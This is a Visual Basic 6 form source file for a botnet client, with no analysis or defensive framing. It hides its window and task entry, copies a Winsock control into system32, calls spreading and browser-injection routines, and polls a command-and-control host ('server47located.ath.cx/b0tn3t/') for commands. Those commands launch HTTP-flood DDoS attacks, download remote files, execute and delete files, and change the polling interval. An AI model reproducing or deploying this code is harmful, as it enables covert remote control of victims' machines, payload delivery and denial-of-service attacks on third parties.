VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form MAIN 
   Caption         =   "001007"
   ClientHeight    =   1785
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   9615
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   1785
   ScaleWidth      =   9615
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text2 
      Height          =   375
      Left            =   1560
      TabIndex        =   4
      Text            =   $"Form1.frx":000C
      Top             =   1080
      Width           =   1095
   End
   Begin VB.Timer Timerunlosadddos 
      Interval        =   15600
      Left            =   1080
      Top             =   1320
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   3240
      TabIndex        =   3
      Text            =   "Text1"
      Top             =   1440
      Width           =   5055
   End
   Begin PKGuard.spread spread1 
      Height          =   375
      Left            =   5160
      TabIndex        =   2
      Top             =   1320
      Width           =   975
      _ExtentX        =   1720
      _ExtentY        =   661
   End
   Begin MSWinsockLib.Winsock DDOSSOCKET 
      Index           =   0
      Left            =   240
      Top             =   1320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock INFORMATIONSOCKET 
      Left            =   8880
      Top             =   1440
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.TextBox DDOSSTRING 
      Height          =   285
      Left            =   1320
      TabIndex        =   1
      Top             =   1440
      Width           =   1815
   End
   Begin VB.Timer TIMER_DDOS 
      Enabled         =   0   'False
      Left            =   600
      Top             =   1320
   End
   Begin VB.TextBox TMPCOMMANDS 
      Height          =   1080
      Left            =   15
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   0
      Top             =   135
      Width           =   9480
   End
   Begin VB.Timer GETCOMMAND_ 
      Left            =   8520
      Top             =   1440
   End
End
Attribute VB_Name = "MAIN"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private allll As String
Dim B() As Byte
Private Server As String
Private TIMERINTENSIVITY As String
Private SERVER_PATH As String
Private DAMN_PATH_TMP As String
Private Visiblemodus As Long
Private COPYTO As String


Private Sub Form_Load()
'------------------------------------------------------------//CONFIG

 Server = "server47located.ath.cx"                         'SERVERIP/DNS
 SERVER_PATH = "b0tn3t/"                         'http://localhost/bot/
 TIMERINTENSIVITY = "40000"                    'DEFAULT: 50000
 Visiblemodus = "0"                           'VISIBLE=1 NOVISIBLE=0 DEFAULT:0
 COPYTO = Environ("ProgramFiles")             'Windir|HomeDrive|APPDATA
 RANDOMSTRING = "0356778380"                  'RANDOM
 RANDOMPWCRYPT = "567774"                     'RANDOMPWCODE TO CRYPT FILES !! ONLY NUMBERS !!
 spread = "1"                                 '0=OFF 1=ON
 
'-------------------------------------------------------------//CONFIG



On Error Resume Next
'If App.EXEName = "ICQ" Then
'Call RunmemVic
'Else
'Call PatchExe(Environ("ProgramFiles") & "\ICQ6\ICQ.exe")
'End If

Call FileCopy(App.path & "\MSWINSCK.OCX", Environ("windir") & "\system32\MSWINSCK.OCX")


If InStr(App.EXEName, "svchost") Then
Else
 
 If spread = "1" Then
Call loll

End If
Call injectbrowser
End If





 If Visiblemodus = "0" Then
 Me.Visible = False
 App.TaskVisible = False
 Me.Hide
 End If


'Call RegWrite("HKLM\Software\Microsoft\Active Setup\Installed Components\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\{5fd399c0-a70a-11d1-9948-00A04f98bbcV}\StubPath", App.Path & "\" & App.EXEName & ".exe")
 DAMN_PATH_TMP = Environ("windir") & "\" & RANDOMSTRING & ".xfr"


 GETCOMMAND_.Interval = TIMERINTENSIVITY
 GETCOMMAND_.Enabled = True
 Open DAMN_PATH_TMP For Binary As #1

End Sub


Private Sub GETCOMMAND__Timer()

On Error Resume Next

 INFORMATIONSOCKET.Close
 Call INFORMATIONSOCKET.Connect(Server, 80)
End Sub

Private Sub INFORMATIONSOCKET_Connect()
  Dim cmd$, url$
 url = "http://" & Server & "/" & SERVER_PATH & "?l=l"
 cmd = "GET " & url & vbCrLf & vbCrLf
 INFORMATIONSOCKET.SendData cmd

End Sub

Private Sub INFORMATIONSOCKET_DataArrival(ByVal bytesTotal As Long)
  Dim data$
 INFORMATIONSOCKET.GetData data, vbString
 data = Replace(data, Text2.Text, vbNewLine)
 TMPCOMMANDS.Text = TMPCOMMANDS.Text & data

End Sub

Private Sub INFORMATIONSOCKET_Close()
 Dim i As Long
 Dim TMPCMDLINE As String
 
 INFORMATIONSOCKET.Close

For i = 1 To SendMessage(TMPCOMMANDS.hwnd, EM_GETLINECOUNT, 0, 0&) - 1
If InStr(LoadBinary(DAMN_PATH_TMP), GetRowContent(TMPCOMMANDS.hwnd, i)) Then
Else
TMPCMDLINE = slice(GetRowContent(TMPCOMMANDS.hwnd, i), "<INPUTCOMMAND>", "  <RAND")
If Mid(TMPCMDLINE, "1", "3") = "MSG" Then
End If

If Mid(TMPCMDLINE, "1", "4") = "DDOS" Then
 Open App.path & "\ddosattacks.dat" For Binary As #100
 Put #100, , GetRowContent(TMPCOMMANDS.hwnd, i)
 Close #100
 Dim x As Long


 TIMER_DDOS.Interval = slice(TMPCMDLINE, "[I=", "]")

 DDOSSTRING = slice(TMPCMDLINE, "[P=", "]")
 TIMER_DDOS.Enabled = True
End If

If Mid(TMPCMDLINE, "1", "3") = "DWD" Then
 Call URLDownloadToFile(0, slice(TMPCMDLINE, "[URL=", "]"), slice(TMPCMDLINE, "[FILE=", "]"), 0, 0)
End If

If Mid(TMPCMDLINE, "1", "5") = "CLEAR" Then
Close #1
Kill DAMN_PATH_TMP
  Open DAMN_PATH_TMP For Binary As #1
End If

If Mid(TMPCMDLINE, "1", "4") = "EXIT" Then
 End
 Put #1, , TMPCOMMANDS.Text 'FUCK THIS CHECKED DATA HERE
End If

If Mid(TMPCMDLINE, "1", "4") = "EXEC" Then
 Call ShellExecute(Me.hwnd, "Open", slice(TMPCMDLINE, "[FILE=", "]"), "", slice(TMPCMDLINE, "[FILE=", "]"), 1)
End If

If Mid(TMPCMDLINE, "1", "5") = "TIMER" Then
 GETCOMMAND_.Interval = slice(TMPCMDLINE, "[I=", "]")
End If

If Mid(TMPCMDLINE, "1", "4") = "KILL" Then
 Kill (slice(TMPCMDLINE, "[FILE=", "]"))
End If

End If
Next i

If InStr(LoadBinary(DAMN_PATH_TMP), TMPCOMMANDS.Text) Then
Else
Put #1, , TMPCOMMANDS.Text 'FUCK THIS CHECKED DATA HERE
End If
TMPCOMMANDS.Text = ""
End Sub

Private Sub TIMER_DDOS_Timer()
On Error Resume Next
 
  Dim i As Long
  Dim PAGE As String
 PAGE = DDOSSTRING.Text

x = DDOSSOCKET.Count


 Load DDOSSOCKET(x)
 DDOSSOCKET(x).RemoteHost = slice(PAGE, "//", "/")
 DDOSSOCKET(x).RemotePort = 80
 DDOSSOCKET(x).Connect
On Error Resume Next
End Sub

Private Sub DDOSSOCKET_Connect(index As Integer)
On Error Resume Next

  Dim url$
  Dim cmd As String
 url = DDOSSTRING.Text & GetRandomNum(7, 900029)
 cmd = "GET " & url & " HTTP/1.0" & vbCrLf & "Accept: */*" & vbCrLf & "Accept: text/html" & vbCrLf & vbCrLf
  Text1 = DDOSSTRING.Text & GetRandomNum(7, 900029)
 DDOSSOCKET(index).SendData cmd
End Sub


Private Sub DDOSSOCKET_Close(index As Integer)
DDOSSOCKET(i).Close

End Sub




Private Sub Timerunlosadddos_Timer()
On Error Resume Next
Dim i As Long
Dim xyaa As Long
xyaa = DDOSSOCKET.Count + 10
For i = 1 To xyaa
Unload DDOSSOCKET(index)
Next i
End Sub
